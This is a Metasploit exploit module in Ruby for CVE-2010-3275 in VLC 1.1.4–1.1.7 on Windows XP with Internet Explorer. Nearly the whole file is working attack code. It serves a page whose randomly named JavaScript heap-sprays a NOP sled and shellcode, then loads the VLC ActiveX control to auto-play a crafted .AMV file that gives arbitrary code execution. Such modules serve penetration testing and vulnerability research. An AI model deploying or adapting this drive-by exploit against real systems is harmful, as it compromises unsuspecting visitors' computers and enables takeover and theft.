##
# $Id: vlc_amv.rb 12137 2011-03-25 21:03:12Z sinn3r $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info={})
		super(update_info(info,
			'Name'        => "VLC AMV Vulnerability",
			'Description' => %q{
				This module exploits VLC media player when handling a .AMV file. By flipping the 0x41st
				byte in the file format, VLC crashes due to an invalid pointer, which allows remote
				attackers to gain arbitrary code execution.
				
				The vulnerable packages include:
				VLC 1.1.4
				VLC 1.1.5
				VLC 1.1.6
				VLC 1.1.7
				},
			'License'     => MSF_LICENSE,
			'Version'     => "$Revision: 12137 $",
			'Author'      =>
				[
					'sinn3r',
				],
			'References' =>
				[
					['CVE', 'CVE-2010-3275'],
					['URL', 'http://www.coresecurity.com/content/vlc-vulnerabilities-amv-nsv-files'],
				],
			'Payload' =>
				{
					'BadChars'        => "\x00",
					'space'           => 1000,
					'StackAdjustment' => -3500,
				},
			'DefaultOptions' =>
				{
					'ExitFunction' => "process",
					'InitialAutoRunScript' => 'migrate -f',
				},
			'Platform' => 'win',
			'Targets'  =>
				[
					[ 'Automatic', {} ],
					[ 'Windows XP SP3 IE6', {'Ret'=>0x0c0c0c0c} ],
					[ 'Windows XP SP3 IE7', {'Ret'=>0x1c1c1c1c} ],
				],
			'DisclosureDate' => "Mar 23 2011",
			'DefaultTarget' => 0))

	end

	def get_trigger_file
		path = File.join(Msf::Config.install_root, "data", "exploits", "CVE-2010-3275.amv")
		f = File.open(path, "rb")
		data = f.read
		f.close
		return data
	end

	def getRet(cli, request)

		if target.name == 'Automatic'

			agent = request.headers['User-Agent']

			case agent
			when /MSIE 6\.0/
				return [0x0c0c0c0c].pack('V') * 8
			when /MSIE 7\.0/
				return [0x1c1c1c1c].pack('V') * 8
			when /^vlc/
				#VLC identifies itself as "VLC" when requesting our trigger file
				return ""
			when /^NSPlayer/
				#NSPlayer is also used while requesting the trigger file
				return ""
			else
				return nil
			end

		else

			#User manually specified a target
			return [target.ret].pack('V') * 8

		end

	end

	def on_request_uri(cli, request)

		#Determine if client is a potential victim either manually or automatically,
		#and then return the appropriate EIP
		nops = getRet(cli, request)
		if nops == nil
			send_not_found(cli)
			return
		end

		if request.uri.match(/\.amv/)
			amv = get_trigger_file
			print_status("Sending trigger file to #{cli.peerhost}:#{cli.peerport}")
			send_response(cli, amv, { 'Content-Type' => 'text/plain' } )
			return
		end

		nopsled   = Rex::Text.to_unescape(nops, Rex::Arch.endian(target.arch))
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

		js_func_name             = rand_text_alpha(rand(6) + 3)
		js_var_blocks_name       = rand_text_alpha(rand(6) + 3)
		js_var_shell_name        = rand_text_alpha(rand(6) + 3)
		js_var_nopsled_name      = rand_text_alpha(rand(6) + 3)
		js_var_index_name        = rand_text_alpha(rand(6) + 3)
		trigger_file             = datastore['URIPATH'] + "/" + rand_text_alpha(rand(6) + 3) + ".amv"

		html = <<-EOS
		<html>
		<head>
		<script>
		function #{js_func_name}() {
			var #{js_var_blocks_name} = new Array();
			var #{js_var_shell_name} = unescape("#{shellcode}");
			var #{js_var_nopsled_name} = unescape("#{nopsled}");
			do { #{js_var_nopsled_name} += #{js_var_nopsled_name} } while (#{js_var_nopsled_name}.length < 82000);
			for (#{js_var_index_name}=0; #{js_var_index_name} < 3500; #{js_var_index_name}++) {
				#{js_var_blocks_name}[#{js_var_index_name}] = #{js_var_nopsled_name} + #{js_var_shell_name};
			}
		}
		#{js_func_name}();
		</script>
		</head>
		<body>
		<object classid="clsid:9BE31822-FDAD-461B-AD51-BE1D1C159921"
				codebase="http://downloads.videolan.org/pub/videolan/vlc/latest/win32/axvlc.cab"
				width="0" height="0"
				events="True">
		<param name="Src" value="#{trigger_file}"></param> 
		<param name="ShowDisplay" value="False" ></param> 
		<param name="AutoLoop" value="no"></param> 
		<param name="AutoPlay" value="yes"></param>
		</object>
		</body>
		</html>
		EOS

		#Remove extra tabs in HTML
		html = html.gsub(/^\t\t/, "")

		print_status("Sending malicious page to #{cli.peerhost}:#{cli.peerport}...")
		send_response( cli, html, {'Content-Type' => 'text/html'} )
	end
end